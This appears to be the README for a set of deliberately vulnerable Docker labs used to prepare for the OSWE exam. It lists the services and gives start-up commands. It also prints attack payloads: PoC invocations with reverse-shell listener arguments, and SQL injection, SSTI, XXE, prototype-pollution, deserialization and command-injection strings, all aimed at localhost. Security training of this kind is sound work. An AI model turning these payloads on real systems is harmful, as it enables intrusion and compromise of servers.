# OSWE Docker Labs

Intentionally vulnerable **teaching applications** you can start with Docker Compose. They model the same vulnerability *classes* as classic OSWE targets (upload, SSTI, XXE, deserial, SQLi, type juggling, XSS chains, etc.) so you can practice white-box review and scripting without hunting old vendor ISOs.

**Authorized lab use only.** Do not expose these services to the internet.

---

## Quick start

```bash
# From repository root
cd labs
./labctl.sh up              # build + start default labs
./labctl.sh urls            # print host ports
./labctl.sh smoke           # HTTP health checks
./labctl.sh status          # docker compose ps
./labctl.sh logs ssti       # tail one service
./labctl.sh down            # stop stack
```

**Requirements**

| Item | Notes |
|------|--------|
| Docker Engine | 20.10+ recommended |
| Compose v2 | `docker compose version` |
| Disk / RAM | ~4 GB free for default set; more for `heavy` (MSSQL + Java) |
| Network | First build pulls base images |

Standalone single-lab (from that lab folder):

```bash
cd ../poc-examples/ssti-jinja2-flask/lab
docker compose up -d --build
```

---

## Lab catalog

| Service | Skill | Host URL | Profile | PoC / notes |
|---------|-------|----------|---------|-------------|
| `file-upload` | File upload → webshell | http://127.0.0.1:8101 | default | `poc-examples/file-upload-rce/` |
| `ssti` | Jinja2 SSTI → RCE | http://127.0.0.1:8102 | default | `poc-examples/ssti-jinja2-flask/` |
| `xxe` | XXE file read / SSRF | http://127.0.0.1:8103 | default | `poc-examples/xxe-file-read-ssrf/` |
| `node-deserial` | node-serialize IIFE | http://127.0.0.1:8104 | default | `poc-examples/nodejs-deserialization/` |
| `bassmaster` | JS injection `/batch` | http://127.0.0.1:8105 | default | `poc-examples/bassmaster-js-injection/` |
| `php-poi` | PHP object injection | http://127.0.0.1:8106 | default | `poc-examples/php-object-injection/` |
| `type-juggling` | Type juggling → admin → upload | http://127.0.0.1:8107 | default | `poc-examples/atutor-type-juggling/` |
| `second-order` | Second-order SQLi (MySQL) | http://127.0.0.1:8108 | default | `poc-examples/second-order-sqli/` |
| `xss-chain` | Stored XSS → admin plugin | http://127.0.0.1:8109 | default | `poc-examples/atmail-xss-rce/` |
| `pg-sqli` | Postgres SQLi → file write | http://127.0.0.1:8110 | default | `poc-examples/manageengine-sqli/` |
| `java-deserial` | Java `ObjectInputStream` | http://127.0.0.1:8111 | **heavy** | `poc-examples/java-deserialization-commons/` |
| `mssql-sqli` | MSSQL SQLi (+ xp_cmdshell limits) | http://127.0.0.1:8112 | **heavy** | `poc-examples/mssql-sqli-xp-cmdshell/` |
| `dotnet-json` | .NET JSON TypeNameHandling | http://127.0.0.1:8113 | default | `poc-examples/dotnet-viewstate-deserialization/` |
| `prototype-pollution` | Server-side prototype pollution → admin/RCE | http://127.0.0.1:8114 | default | `poc-examples/prototype-pollution/` |
| `ssrf` | SSRF → internal-only flag service | http://127.0.0.1:8115 | default | `poc-examples/ssrf-chaining/` |
| `websocket` | WebSocket JSON → command injection | http://127.0.0.1:8116 (`ws://…/ws`) | default | `poc-examples/websocket-injection/` |

App source for each lab: `poc-examples/<name>/lab/` (Dockerfile, app code, lab README).

---

## Profiles

```bash
./labctl.sh up                        # default only (no MSSQL/Java images)
./labctl.sh up --profile heavy        # + java-deserial + mssql-sqli
./labctl.sh up file-upload ssti xxe   # subset of services
```

---

## Suggested study workflow

1. `./labctl.sh up` and open the lab URL in a browser.
2. Read the in-app description and the matching `lab/README.md`.
3. White-box: open the app source under `poc-examples/*/lab/app/` (or container).
4. Confirm the bug manually in Burp.
5. Point the matching PoC at `127.0.0.1` and the host port (table above).
6. Log the session in `study-log/` and tick `Progress-Tracker.md`.

Map of skill → lab → guide: [Lab-Setup-Matrix.md](../Lab-Setup-Matrix.md).

---

## Example PoC commands (default stack)

Run from the relevant `poc-examples/<dir>/` directory (or pass absolute paths).

```bash
# SSTI
python3 poc-examples/ssti-jinja2-flask/poc.py 127.0.0.1 8102 127.0.0.1 4444

# File upload
python3 poc-examples/file-upload-rce/poc.py 127.0.0.1 8101 127.0.0.1 4444 \
  --endpoint /upload.php --upload-dir /uploads/ --bypass double_ext --shell-type php

# Node deserial
python3 poc-examples/nodejs-deserialization/poc.py 127.0.0.1 8104 127.0.0.1 4444

# Bassmaster-style batch
python3 poc-examples/bassmaster-js-injection/poc.py \
  --target-ip 127.0.0.1 --target-port 8105 --command id

# PHP object injection
python3 poc-examples/php-object-injection/poc.py 127.0.0.1 8106 127.0.0.1 4444 \
  --param-name data --delivery cookie --pop-chain generic

# Postgres SQLi (ManageEngine-style path)
python3 poc-examples/manageengine-sqli/poc.py \
  --target-ip 127.0.0.1 --target-port 8110 --delay 3

# Prototype pollution (2026-style)
curl -s -X POST http://127.0.0.1:8114/api/prefs \
  -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'
curl -s http://127.0.0.1:8114/admin

# SSRF → internal flag
curl -s -X POST http://127.0.0.1:8115/fetch \
  -d 'url=http://127.0.0.1:9999/internal/flag'

# WebSocket command injection (needs websocket-client or websocat)
python3 -c "from websocket import create_connection; import json; w=create_connection('ws://127.0.0.1:8116/ws'); print(w.recv()); w.send(json.dumps({'type':'flag'})); print(w.recv())"
```

Per-lab flags, manual curl recipes, and flags: see each `poc-examples/*/lab/README.md`.

---

## Manual smoke checks (verified patterns)

| Lab | Quick check |
|-----|-------------|
| SSTI | `curl -sG 'http://127.0.0.1:8102/' --data-urlencode 'name={{7*7}}'` → Hello **49** |
| XXE | POST XML with `file:///flag.txt` entity to `/upload` → `OSWE{xxe_lab_flag}` |
| Type juggling | Reset admin with magic hash token on `/reset.php` → login `admin` / new pass |
| Second-order | Register `lastname=' OR SLEEP(3)-- -` then search username → ~3s delay |
| PG SQLi | `ForMasRange=1;SELECT pg_sleep(2)--` → ~2s; `COPY … TO '/export/…'` → `/static/…` |
| XSS chain | `curl -b role=admin -d 'code=…' …/admin/plugin/install` → `/plugins/shell.php` |
| .NET JSON | POST `{"$type":"OsweLab.EvilCommand, DotNetLab","Cmd":"id"}` to `/api/parse` |
| Prototype pollution | POST `__proto__.isAdmin` then GET `/admin` → flag |
| SSRF | POST `/fetch` with `url=http://127.0.0.1:9999/internal/flag` |
| WebSocket | `{"type":"cmd","cmd":"id"}` or `{"type":"flag"}` on `ws://…/ws` |

---

## Design notes

- Labs are **minimal educational clones**, not full ATutor / Atmail / ManageEngine / Jenkins products.
- Use official WEB-300 course VMs when you need exact vendor fidelity.
- Flags typically live in `/flag.txt` and/or a web-reachable path after RCE.
- Containers prioritize exploitability over production hardening (often root, open eval, etc.).

### Limitations (read before filing “broken lab”)

| Topic | Reality in Docker |
|-------|-------------------|
| .NET ViewState + ysoserial.net | Prefer Windows VM; lab uses **JSON** TypeNameHandling on Linux |
| MSSQL `xp_cmdshell` | Linux SQL Server is limited; lab still trains stacked/blind SQLi |
| Vendor-specific PoC recon | Some PoCs check for product banners; teaching apps use **OSWE-LAB** / simplified paths — prefer `lab/README.md` recipes |

---

## Troubleshooting

| Issue | Fix |
|-------|-----|
| Port already in use | `./labctl.sh down` or edit host ports in `docker-compose.yml` |
| Build / TLS pull errors | Retry; check Docker Hub connectivity |
| `smoke` fails one service | `./labctl.sh logs <service>`; `docker compose up -d --build <service>` |
| MSSQL slow | Wait 30–90s after start; check `./labctl.sh logs mssql` |
| Upload permission denied | Rebuild `file-upload` image; uploads dir is `chmod 777` in Dockerfile |
| PG `COPY` permission denied | Ensure `pg-sqli-db` entrypoint chmods `/export` (see compose) |
| XXE “parse error” with curl | Shell expands `&`; use `--data-binary @file.xml` or `--data-urlencode` |
| Reset stack completely | `./labctl.sh reset` (destroys volumes) |

---

## Repository layout (labs-related)

```text
labs/
  README.md              ← this file
  labctl.sh              ← up / down / smoke / urls
  docker-compose.yml     ← master stack (all services)
poc-examples/<vuln>/
  poc.py
  Notes.md               ← methodology + Docker pointer
  lab/
    Dockerfile
    docker-compose.yml   ← optional standalone
    README.md            ← ports, flags, exploit recipes
    app/                 ← vulnerable application source
```

---

## Related documentation

| Doc | Purpose |
|-----|---------|
| [Lab-Setup-Matrix.md](../Lab-Setup-Matrix.md) | Skill → Docker port → PoC/guide |
| [OSWE-Study-Roadmap.md](../OSWE-Study-Roadmap.md) | 8-week plan using these labs |
| [Progress-Tracker.md](../Progress-Tracker.md) | Readiness checklist |
| [Exam-Day-Runbook.md](../Exam-Day-Runbook.md) | Exam ops (not for these labs) |
| [poc-examples/README.md](../poc-examples/README.md) | PoC skeletons + port table |
| [guides/](../guides/) | Methodology by vuln class |

---

## Safety

These applications are **deliberately insecure**. Bind to localhost only (default compose). Do not deploy on shared or public networks. Use only for authorized training and personal OSWE preparation.
